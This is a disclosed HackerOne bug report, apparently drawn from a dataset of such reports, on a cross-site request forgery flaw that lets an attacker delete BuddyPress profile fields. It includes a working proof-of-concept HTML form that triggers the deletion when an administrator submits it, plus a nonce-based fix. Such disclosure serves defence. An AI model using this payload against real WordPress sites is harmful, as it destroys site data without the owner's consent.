---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '836187'
original_report_id: '836187'
title: CSRF in Profile Fields allows deleting any field in BuddyPress
weakness: Cross-Site Request Forgery (CSRF)
team_handle: wordpress
created_at: '2020-04-01T13:28:23.968Z'
disclosed_at: '2020-05-22T00:32:45.432Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 5
asset_identifier: BuddyPress Core
asset_type: SOURCE_CODE
max_severity: critical
tags:
- hackerone
- cross-site-request-forgery-csrf
---

# CSRF in Profile Fields allows deleting any field in BuddyPress

## Metadata

- HackerOne Report ID: 836187
- Weakness: Cross-Site Request Forgery (CSRF)
- Program: wordpress
- Disclosed At: 2020-05-22T00:32:45.432Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

## Description:

CSRF in Profile Fields allows deleting any field in BuddyPress
Version: Latest

## Steps To Reproduce:
Step1: Using a form like so to create the CSRF:
<html>
  <body>
  <script>history.pushState('', '', '/')</script>
    <form action="[domain]/wp-admin/users.php">
      <input type="hidden" name="page" value="bp&#45;profile&#45;setup" />
      <input type="hidden" name="mode" value="delete&#95;field" />
      <input type="hidden" name="field&#95;id" value="[id_field]" />
      <input type="submit" value="Submit request" />
    </form>
  </body>
</html>
Change your [domain] and [id_field]
Step 2: When admin click with step 1 was hidden in images,.... Step1 will allow deleting with [id_field]


## Recommendations
Adding _wpnonce for this function

## Impact

Attacker will this vulnerable to delete profile fileds, break availability and integrity.

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
